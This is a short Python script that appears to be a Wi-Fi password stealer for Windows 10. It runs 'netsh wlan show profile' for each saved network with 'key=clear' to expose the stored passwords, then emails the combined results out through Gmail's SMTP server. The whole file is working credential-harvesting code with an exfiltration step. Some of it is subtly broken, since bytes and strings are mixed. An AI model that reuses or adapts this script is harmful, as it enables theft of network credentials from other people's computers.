#!/usr/bin/env python3
"""currently supports Windows 10 only"""
import subprocess
import smtplib
import re


def send_email(my_email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(my_email, password)
    # send from my_email to my_email (from, to, message)
    server.sendmail(my_email, my_email, message)
    server.quit()


command = f"netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
# # find only 1 network profile at a time
# network_names = re.search("(?:Profile\s*:\s)(.*)", networks)
# # prints only the profile name, if group(0) prints the whole string
# print(network_names.group(1))

# find all network profiles and display it as a list
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""

for profile_name in network_names:
    command = f"netsh wlan show profile {profile_name} key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result += current_result

# use for testing
my_email = input("email: ")
password = input("password: ")

send_email(my_email, password, result)
